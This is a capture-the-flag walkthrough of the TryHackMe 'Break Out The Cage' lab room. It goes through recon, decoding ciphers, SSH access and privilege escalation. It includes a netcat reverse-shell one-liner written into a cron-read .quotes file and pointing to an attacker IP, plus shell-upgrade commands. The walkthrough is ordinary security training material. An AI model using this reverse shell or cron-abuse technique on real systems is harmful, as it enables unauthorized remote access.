---
layout: post
title: "Break Out The Cage"
date: 2022-10-21
categories: [Tryhackme, Easy-THM]
tags: [ftp, base64, Vigenere-cipher, ffuf, pspy64, python, email]
image: ../../assets/img/posts/breakoutthecage1.png 

---

## Description

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

|**Room**|[Break Out The Cage](https://tryhackme.com/room/breakoutthecage1)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Magna](https://tryhackme.com/p/Magna)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.215.181 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/187351008-5f1f1750-ca50-40d1-9e36-e68b72569c6a.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sV -sC -p21,22,80 10.10.215.181 -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/187351043-777108cc-c11b-4d30-a97b-fe2ea29d706a.png)

Result scan shows that port 21 is running ftp service, port 22 is running ssh service, port 80 is running apache webserver. Let's enumerate ftp service.

Using ftp client tool, we can access ftp service running on the machine,

```bash
ftp 10.10.215.181
```

![image](https://user-images.githubusercontent.com/67465230/187351076-5c62fd73-0fcb-4eec-953f-2fe621ba804b.png)

Enumerate directory and there is a file lying around,

![image](https://user-images.githubusercontent.com/67465230/187351106-255caea8-6af8-4324-b4cd-7c6e9de18ea0.png)

We can download this file on our system,

```bash
get dad_tasks
```

Reading the file and I got the idea that this string is encoded with base64,

![image](https://user-images.githubusercontent.com/67465230/187351131-65431734-b6b6-451b-a3a6-38e89b45bff0.png)

So we can try to decode this string,

```bash
echo <base64-here> | base64 -d
```

![image](https://user-images.githubusercontent.com/67465230/187351163-6f1b9a6a-e635-476a-a5c6-e8122af61470.png)

Looks like this is another encoded string we got.

Visit [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) and pasting the encoded string here and after analysis, we now know that this is a Vigenere Cipher,

![image](https://user-images.githubusercontent.com/67465230/187351202-49e1a7a8-4b9c-4938-bde0-3087abb605b7.png)

Let's visit http://10.10.215.181 and we landed on a page which has cage pictures,

![image](https://user-images.githubusercontent.com/67465230/187351254-13ecfe37-6a70-4b0b-9cb3-b7f74ef9cf10.png)

Now, we can try to fuzz directories using `ffuf` tool,

```bash
ffuf -u http://10.10.215.181/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187351314-c7fda3a7-fadc-4a90-938c-813aa29e21a2.png)

we got some directories but there is a unique directory named auditions.

Navigating to http://10.10.215.181/auditions,

![image](https://user-images.githubusercontent.com/67465230/187351337-fa6a0955-89cd-4f77-82ac-13f50bce2241.png)

there is a audio file. 

So let's download it using `wget` command,

```bash
wget http://10.10.215.181/auditions/must_practice_corrupt_file.mp3
```

Now, we can use `sonic-visualizer` tool to get the text  from audio file,

![image](https://user-images.githubusercontent.com/67465230/187351381-40bb4014-6911-442e-b568-658993cfa7c9.png)

Now that we got the key, *namelesstwo*, we can paste this key and get the result,

![image](https://user-images.githubusercontent.com/67465230/187351483-cd80ebdb-aec3-4b86-ab1c-14032c92357e.png)

we got the weston user password.

We can try to login using weston user and password,

```bash
ssh weston@10.10.215.181
```

![image](https://user-images.githubusercontent.com/67465230/187351520-c5fb760e-a941-4fa7-bdfe-58cedfef5ccd.png)

and we get in!!

After some enumeration, there is nothing I found unusual on the system so I decided to run [pspy64](https://github.com/DominicBreuker/pspy) on this system,

```bash
./pspy64 -pf -i 1000
```

![image](https://user-images.githubusercontent.com/67465230/187351592-0d6e090a-7b62-4831-8062-70f7ad5ab36a.png)

and we will see that cronjob is running silently but it's not showing on the surface and the file which is running has the path */opt/.dads_scripts/spread_the_quotes.py*.

First checking the owner of this python file, which is cage,

![image](https://user-images.githubusercontent.com/67465230/187351637-903b80d3-3e8c-4f64-b741-721fb32d0fcc.png)

so we can elevate our privileges to cage user.

Reading the content of the file,

![image](https://user-images.githubusercontent.com/67465230/187351713-8dec88da-e350-44d7-8205-5e1a107429d2.png)

We can see that it reads the`.quotes`file and selects a random line from it. Which is then displayed to all the users via the system command `wall`.

We can use one-liner netcat listener to catch a reverse shell,

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.131 4444 >/tmp/f" > .quotes
```

after waiting for a moment, we will become cage user. We will get a shell but it will be a under-privilege one so we will need to improve it using sequence of these commands,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
stty rows 38 columns 116
```

Enumerating directory and there we find a file named Super_Duper_Checklist,

![image](https://user-images.githubusercontent.com/67465230/187351754-6f90c2e5-7772-4702-bc40-8c57d5c4d036.png)

Reading the Super_Duper_Checklist file, 

![image](https://user-images.githubusercontent.com/67465230/187351787-3c590e60-eafe-4fae-abf5-34ce6115b649.png)

we got the flag. 

Now, after enumerating directory, I found that there is a directory named email_backup and there are 3 files which lie around there,

![image](https://user-images.githubusercontent.com/67465230/187351837-108f1634-991c-4bd0-bdd7-65f17638c096.png)

After reading the 3rd email file, we got a strings which is encoded and the user cage is emphasizing on the word FACE.

![image](https://user-images.githubusercontent.com/67465230/197141311-43106367-dcb1-4134-a7a9-762ed9e7feff.png)

So let's use this keyword to decode the string we got,

![image](https://user-images.githubusercontent.com/67465230/197141426-a5a4b309-fbf4-4f6d-9ea0-160b577befdc.png)

We got the password.

Now, we can try to switch user to root user, but it didn't work. The password seems correct but it didn't work.

![image](https://user-images.githubusercontent.com/67465230/197141520-c5a3a6c5-cacc-4a78-ac9d-931286b18414.png)

So I try to switch user from weston user shell,

```bash
su root
```

![image](https://user-images.githubusercontent.com/67465230/187352080-85ce280d-fcb4-4069-9829-9f52f7a5e431.png)

and we become root.